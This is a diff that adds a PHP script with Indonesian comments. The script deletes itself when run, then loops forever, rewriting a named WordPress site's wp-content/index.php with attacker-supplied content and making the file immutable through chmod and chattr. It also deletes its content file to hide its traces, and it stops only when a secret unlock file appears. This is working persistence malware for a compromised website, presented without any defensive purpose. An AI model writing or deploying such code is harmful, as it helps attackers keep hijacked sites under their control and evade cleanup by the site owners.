@@ -1,0 +1,45 @@
+<?php
+@unlink($_SERVER['SCRIPT_FILENAME']); // Menghapus file script ini setelah dijalankan
+error_reporting(0);
+ignore_user_abort(true); // Script tetap berjalan meskipun koneksi terputus
+set_time_limit(0); // Script tidak memiliki batas waktu eksekusi
+
+$unlockFile = 'unlock.txt'; // File untuk memberikan sinyal penghentian script
+$lockFilePath = '/home/bingaloo/bingaloo.com/wp-content/index.php'; // File yang akan dikunci
+$lockContentFile = 'content.txt'; // File berisi konten untuk mengunci
+
+// Periksa apakah file konten kunci tersedia
+if (!file_exists($lockContentFile)) {
+    exit("ERROR: File konten kunci tidak ditemukan.\n");
+}
+
+// Baca isi file konten kunci
+$lockContent = file_get_contents($lockContentFile);
+@unlink($lockContentFile); // Hapus file konten kunci untuk menyembunyikan jejak
+
+// Fungsi untuk membuat file immutable
+function makeImmutable($file) {
+    chmod($file, 0444); // Set read-only
+    exec("chattr +i $file"); // Set atribut immutable
+}
+
+// Loop utama
+while (true) {
+    // Periksa apakah ada sinyal untuk berhenti
+    if (file_exists($unlockFile)) {
+        @unlink($unlockFile); // Hapus file sinyal
+        exit("Unlock signal received. Script terminated.\n");
+    }
+
+    // Kunci file
+    if (file_exists($lockFilePath)) {
+        @unlink($lockFilePath); // Hapus file jika sudah ada
+    }
+
+    if (file_put_contents($lockFilePath, $lockContent) !== false) {
+        makeImmutable($lockFilePath); // Buat file immutable
+    }
+
+    sleep(1); // Tunggu 1 detik sebelum iterasi berikutnya
+}
+?>
